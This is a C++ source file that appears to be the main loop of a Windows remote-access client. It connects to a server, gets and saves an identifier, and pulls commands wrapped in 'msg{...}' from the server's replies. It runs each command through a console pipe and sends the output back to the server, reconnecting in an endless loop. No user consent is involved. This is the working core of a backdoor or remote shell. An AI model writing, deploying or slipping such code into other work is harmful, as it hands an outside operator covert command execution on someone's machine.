#include "addition.h"
#include <string.h>
using namespace mySTL;

int main()
{
	extractMsgIdentifier *identifier = nullptr;
	char *id;
	char *msg;
	char *delivered;
	SOCKET *sock = nullptr;
	SOCKET *responseSock = nullptr;
	sockaddr_in *addr;
	int isStart = false;
	if ( (id = readFromFile(ID_FILE_NAME)) == nullptr )
	{
		id = mySTL::addStr(id, "-1");
	}
#ifndef NDEBUG
	printf("id: %s\n", id);
#endif
	char *output = nullptr;
	addr = initPreConnection();
	sock = initConnection(addr);
	sendRequest(sock, id);
	delivered = readHeader(sock);
	while ( true )
	{
		if (delivered == nullptr)
		{
			closesocket(*sock);
			free(sock);
			printf("\nClosed\n");
			sock = initConnection(addr);
			sendRequest(sock, id);
			delivered = readHeader(sock);
			continue;
		}
		else
		{
			printf("%s", delivered);
			unsigned int lenStr = strlen(delivered);
			for (int i = 0; i < lenStr ; i++)
			{
				if((identifier = mySTL::extractMsg(delivered[i], "msg{$}",
												   identifier)) != nullptr &&
						(msg = identifier->msg) != nullptr)
				{
					if ( msg[strlen(msg)-1] == '#')
					{
						msg[strlen(msg)-1] = 0;
						free(id);
						id = nullptr;
						id = mySTL::addStr(id, msg);
						writeToFile(ID_FILE_NAME, id);
#ifndef NDEBUG
						printf("id: %s\n", id);
#endif
						closesocket(*sock);
						free(sock);
						goto endLoop;
						
					}
					if ( !strcmp(msg, "&ping") == false )
					{
						isStart = execCommand(msg);
						//printf("%s", output);
						
					}
					if(identifier != nullptr)
					{
						free(identifier->msg);
						identifier->msg = nullptr;
					}
				}
			}
		}
		if (isStart == true)
		{
			output = readConsoleOutput(hReadPipe1);
			
		}
		if ( output != nullptr )
		{
			if (responseSock != nullptr)
			{
				closesocket(*responseSock);
				free(responseSock);
			}
			
			//printf("output: %s", output);
			responseSock = initConnection(addr);
			sendConsoleOutput(responseSock, output, id);
			//Sleep(1);
			free(output);
			output = nullptr;
		}
		Sleep(LOOP_TIME_WAIT);
endLoop:
		if (delivered != nullptr)
		{
			free(delivered);
			delivered = nullptr;
		}
		delivered = listenData(sock);
	}
}
